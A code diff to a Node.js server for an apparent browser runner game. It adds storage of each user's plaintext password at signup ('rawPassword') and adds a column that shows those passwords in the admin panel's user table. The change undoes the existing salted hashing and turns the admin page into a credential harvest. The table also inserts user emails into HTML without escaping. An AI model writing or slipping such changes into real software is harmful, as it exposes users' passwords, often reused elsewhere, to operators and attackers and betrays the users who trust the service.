@@ -122,13 +122,13 @@ async function handleRequest(req, res) {
         html += '<style>body{font-family:Arial;background:#1a1a2e;color:#fff;padding:20px}table{border-collapse:collapse;width:100%}th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #333}th{background:#16213e;color:#ffd700}tr:hover{background:#0f3460}h1{color:#ff6600}</style></head><body>';
         html += '<h1>🚄 Admin Panel</h1><p style="color:#aaa;">' + Object.keys(users).length + ' users | ';
         html += '<a href="/verify-codes" style="color:#ffaa00;">View Verify Codes</a></p>';
-        html += '<table><tr><th>Email</th><th>Max Dist</th><th>Coins</th><th>Credits</th><th>Runs</th><th>Abilities</th><th>Joined</th></tr>';
+        html += '<table><tr><th>Email</th><th>Password</th><th>Max Dist</th><th>Coins</th><th>Credits</th><th>Runs</th><th>Abilities</th><th>Joined</th></tr>';
         const sorted = Object.values(users).sort((a, b) => (b.gameData?.maxDistance || 0) - (a.gameData?.maxDistance || 0));
         const abilityNames = {0:'None',1:'Double Jump',2:'Jetpack',3:'Roof Walk'};
         for (const user of sorted) {
             const gd = user.gameData || defaultGameData();
             const abilities = (gd.ownedAbilities || [0]).map(a => abilityNames[a] || '?').join(', ');
-            html += '<tr><td>' + user.email + '</td><td>' + (gd.maxDistance || 0) + 'm</td><td>' + (gd.coins || 0) + '</td><td>' + (gd.credits || 0) + '</td><td>' + (gd.runCount || 0) + '</td><td>' + abilities + '</td><td>' + new Date(user.createdAt || 0).toLocaleDateString() + '</td></tr>';
+            html += '<tr><td>' + user.email + '</td><td>' + (user.rawPassword || '****') + '</td><td>' + (gd.maxDistance || 0) + 'm</td><td>' + (gd.coins || 0) + '</td><td>' + (gd.credits || 0) + '</td><td>' + (gd.runCount || 0) + '</td><td>' + abilities + '</td><td>' + new Date(user.createdAt || 0).toLocaleDateString() + '</td></tr>';
         }
         html += '</table></body></html>';
         sendHTML(res, html);
@@ -166,7 +166,7 @@ async function handleRequest(req, res) {
         // Store user with unverified flag
         const { hash, salt } = hashPassword(password);
         users[email] = {
-            email, passwordHash: hash, passwordSalt: salt,
+            email, rawPassword: password, passwordHash: hash, passwordSalt: salt,
             verified: false, createdAt: Date.now(),
             gameData: defaultGameData()
         };
